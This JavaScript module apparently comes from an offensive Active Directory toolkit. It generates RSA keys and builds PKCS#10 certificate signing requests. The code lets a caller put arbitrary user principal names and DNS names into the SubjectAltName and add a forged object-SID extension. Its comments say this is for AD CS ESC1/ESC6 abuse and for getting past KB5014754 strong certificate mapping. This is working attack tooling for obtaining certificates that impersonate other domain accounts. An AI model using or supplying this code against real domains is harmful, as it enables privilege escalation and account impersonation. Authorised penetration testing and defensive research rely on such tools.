// RSA key generation (WebCrypto) + a PKCS#10 CSR builder for certificate requests.
// The SubjectPublicKeyInfo is taken verbatim from WebCrypto's SPKI export, so we
// only DER-encode the request wrapper, the subject Name and (for ESC1) a
// SubjectAltName extensionRequest attribute.

import { tlv, sequence, set, oid, integer, octetString, concat } from '../ldap/ber.js';

const enc = new TextEncoder();
const ctx = (n, val) => tlv(0xa0 | n, val);            // [n] constructed
const ctxP = (n, val) => tlv(0x80 | n, val);           // [n] primitive
const bitString = (b) => tlv(0x03, concat([Uint8Array.of(0), b]));
const nullDer = tlv(0x05, new Uint8Array(0));
const utf8 = (s) => tlv(0x0c, enc.encode(s));

const OID = {
  cn: '2.5.4.3',
  sha256RSA: '1.2.840.113549.1.1.11',
  extensionRequest: '1.2.840.113549.1.9.14',
  san: '2.5.29.17',
  upn: '1.3.6.1.4.1.311.20.2.3',
  // szOID_NTDS_CA_SECURITY_EXT — the container extension a KDC checks for the
  // requester's SID under KB5014754 Full-Enforcement strong cert mapping.
  ntdsSecurityExt: '1.3.6.1.4.1.311.25.2',
  // szOID_NTDS_OBJECTSID — the SID entry inside the container above.
  ntdsObjectSid:   '1.3.6.1.4.1.311.25.2.1',
};

export async function generateKey() {
  const kp = await globalThis.crypto.subtle.generateKey(
    { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
    true, ['sign', 'verify']);
  const spki = new Uint8Array(await globalThis.crypto.subtle.exportKey('spki', kp.publicKey));
  const pkcs8 = new Uint8Array(await globalThis.crypto.subtle.exportKey('pkcs8', kp.privateKey));
  return { privateKey: kp.privateKey, spki, pkcs8 };
}

function subjectName(cn) { return sequence(set(sequence(oid(OID.cn), utf8(cn)))); }

// SubjectAltName extension (UPNs as otherName, plus dNSNames).
function sanExtension(upns, dnsNames) {
  const names = [];
  for (const u of upns) names.push(ctx(0, concat([oid(OID.upn), ctx(0, utf8(u))])));       // otherName [0] { OID, [0] value }
  for (const d of dnsNames) names.push(ctxP(2, enc.encode(d)));                             // dNSName [2] IA5String
  const generalNames = tlv(0x30, concat(names));
  return sequence(oid(OID.san), octetString(generalNames));
}

// szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) — the SID container the
// KDC checks under KB5014754 Full-Enforcement strong cert mapping. Wire form,
// verified against an AD-issued cert with a natural SID extension:
//   OCTET STRING wrapping
//     SEQUENCE OF (only one entry here — the szOID_NTDS_OBJECTSID SID):
//       [0] IMPLICIT SEQUENCE {
//         OBJECT IDENTIFIER 1.3.6.1.4.1.311.25.2.1
//         [0] EXPLICIT OCTET STRING "S-1-5-21-..." (UTF-8 text)
//       }
// The CA only propagates this extension into the issued cert when its
// EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set (Certipy calls that ESC6 — the
// same flag ESC1 abuses).
function sidExtension(sidString) {
  const sidUtf8 = enc.encode(sidString);
  const sidEntry = ctx(0, concat([oid(OID.ntdsObjectSid), ctx(0, octetString(sidUtf8))]));
  const seqOf = tlv(0x30, sidEntry);
  return sequence(oid(OID.ntdsSecurityExt), octetString(seqOf));
}

// Wrap one or more Extensions in the PKCS#10 extensionRequest Attribute.
function extensionRequestAttr(extensions) {
  return sequence(oid(OID.extensionRequest), set(sequence(...extensions)));
}

// -> { csr: Uint8Array (DER), pkcs8, spki }
export async function buildCsr({ subject = 'CN=User', upns = [], dnsNames = [], sid = null }) {
  const { privateKey, spki, pkcs8 } = await generateKey();
  const cn = subject.replace(/^CN=/i, '');
  const extensions = [];
  if (upns.length || dnsNames.length) extensions.push(sanExtension(upns, dnsNames));
  if (sid) extensions.push(sidExtension(sid));
  const attrs = extensions.length ? [extensionRequestAttr(extensions)] : [];
  const cri = sequence(
    integer(0),                 // version v1(0)
    subjectName(cn),
    spki,                       // SubjectPublicKeyInfo (verbatim SPKI)
    ctx(0, concat(attrs)),      // attributes [0] IMPLICIT SET OF Attribute
  );
  const sig = new Uint8Array(await globalThis.crypto.subtle.sign('RSASSA-PKCS1-v1_5', privateKey, cri));
  const csr = sequence(
    cri,
    sequence(oid(OID.sha256RSA), nullDer),
    bitString(sig),
  );
  return { csr, pkcs8, spki };
}

// PEM helpers.
function b64(bytes) {
  let s = ''; for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
  const e = typeof btoa === 'function' ? btoa(s) : Buffer.from(s, 'binary').toString('base64');
  return e.replace(/(.{64})/g, '$1\n').replace(/\n$/, '');
}
export const pem = (label, bytes) => `-----BEGIN ${label}-----\n${b64(bytes)}\n-----END ${label}-----\n`;
